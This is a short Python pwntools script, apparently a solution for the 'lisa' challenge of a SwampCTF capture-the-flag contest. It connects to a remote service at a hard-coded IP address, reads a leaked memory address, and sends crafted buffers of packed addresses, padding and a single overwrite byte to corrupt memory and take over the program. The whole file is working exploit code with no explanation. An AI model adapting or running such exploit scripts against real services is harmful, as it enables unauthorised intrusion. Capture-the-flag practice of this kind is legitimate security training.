from pwn import *
import os

# Run process
context.arch = 'x86'
context.terminal = ['tmux','new-window']
context.aslr = None

#r = remote('chal1.swampctf.com',1337)
r = remote('18.191.244.121', 12345)

#r = process(['./lisa'])

#r = gdb.debug(['./lisa'],
#        """
#        b *0x56555800
#        """
#)


r.recvuntil("Here's your share: ")
addr = r.recvuntil("\n")
addr = int(addr[:-1],16)



r.send(p32(0)+ p32(addr)+ p32(10) + "A"*(0x30-12))
r.send("B"*(0x1d-1) + "\x15")
r.send(p32(0)+ p32(addr)+ p32(0x10) + "A"*(0x30-12))

r.clean_and_log(1)


